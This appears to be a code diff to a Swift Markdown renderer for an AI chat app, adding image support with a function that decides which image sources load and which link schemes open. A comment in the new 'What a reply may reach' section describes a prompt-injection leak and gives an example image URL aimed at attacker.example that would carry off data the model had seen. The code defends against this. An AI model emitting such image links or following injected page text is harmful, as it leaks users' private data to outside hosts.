@@ -5,8 +5,9 @@ import Foundation
 /// SwiftUI renders inline Markdown (`AttributedString(markdown:)` handles
 /// emphasis, code spans and links) but not blocks, so this splits a reply into
 /// the blocks a chat transcript needs: paragraphs, headings, fenced code, lists
-/// (with nesting depth and task checkboxes), quotes, rules and tables. Inline
-/// text is left as Markdown for the view to render.
+/// (with nesting depth and task checkboxes), quotes, rules, tables, and images
+/// on a line of their own. Inline text is left as Markdown for the view to
+/// render (an image inside a sentence shows as its alt text).
 ///
 /// It is forgiving rather than strict CommonMark. Replies are streamed, so the
 /// parser sees every half-finished prefix of a message; an unclosed fence is a
@@ -19,6 +20,8 @@ public indirect enum MarkdownBlock: Hashable, Sendable {
     case quote([MarkdownBlock])
     case table(header: [String], rows: [[String]])
     case rule
+    /// `![alt](source)` on a line of its own. See `markdownImageSource`.
+    case image(alt: String, source: String)
 }
 
 public struct MarkdownListItem: Hashable, Sendable {
@@ -81,12 +84,30 @@ private struct MarkdownParser {
             } else if trimmed.hasPrefix("|"), i + 1 < lines.count, MarkdownParser.isTableDivider(lines[i + 1]) {
                 flush()
                 blocks.append(table())
+            } else if let images = MarkdownParser.images(trimmed) {
+                flush()
+                blocks += images
+                i += 1
             } else {
                 paragraph.append(trimmed)
                 i += 1
             }
         }
         flush()
+        return blocks
+    }
+
+    /// A line made only of images, as one block each; nil for anything else.
+    static func images(_ trimmed: String) -> [MarkdownBlock]? {
+        guard trimmed.hasPrefix("![") else { return nil }
+        let image = #/!\[([^\]]*)\]\(\s*<?([^\s()<>]*)>?(?:\s+"[^"]*")?\s*\)/#
+        var blocks: [MarkdownBlock] = []
+        var rest = Substring(trimmed)
+        while !rest.isEmpty {
+            guard let match = rest.prefixMatch(of: image) else { return nil }
+            blocks.append(.image(alt: String(match.1), source: String(match.2)))
+            rest = rest[match.range.upperBound...].drop { $0 == " " || $0 == "\t" }
+        }
         return blocks
     }
 
@@ -231,4 +252,41 @@ private struct MarkdownParser {
         }
         return .table(header: header, rows: rows)
     }
+}
+
+// MARK: - What a reply may reach
+
+/// How an image in a reply is shown.
+public enum MarkdownImageSource: Hashable, Sendable {
+    /// Already in the reply (a data URL): shown as it is.
+    case inline(Data)
+    /// On the web: loaded only when the user asks. A reply can be steered by a
+    /// page the model read, and an image is fetched the moment it renders, so
+    /// `![](https://attacker.example/p.png?d=…)` would carry off whatever the
+    /// model had seen without a tap.
+    case remote(URL, host: String)
+    /// Anything else (another scheme, a relative path, a malformed URL): not shown.
+    case blocked
+}
+
+public func markdownImageSource(_ source: String) -> MarkdownImageSource {
+    let trimmed = source.trimmingCharacters(in: .whitespaces)
+    let dataPrefix = #/^data:image\/(png|gif|jpeg|webp);base64,/#.ignoresCase()
+    if let match = trimmed.prefixMatch(of: dataPrefix) {
+        guard let data = Data(base64Encoded: String(trimmed[match.range.upperBound...])), !data.isEmpty else { return .blocked }
+        return .inline(data)
+    }
+    guard let url = URL(string: trimmed), let scheme = url.scheme?.lowercased(),
+          scheme == "http" || scheme == "https",
+          let host = url.host, !host.isEmpty
+    else { return .blocked }
+    let port = url.port.map { ":\($0)" } ?? ""
+    return .remote(url, host: host + port)
+}
+
+/// Links a tap may open. Anything else in a reply (`shortcuts://…`, another
+/// app's scheme) is left inert: the text came from a model, not from the user.
+public func isOpenableLink(_ url: URL) -> Bool {
+    guard let scheme = url.scheme?.lowercased() else { return false }
+    return ["http", "https", "mailto", "tel"].contains(scheme)
 }
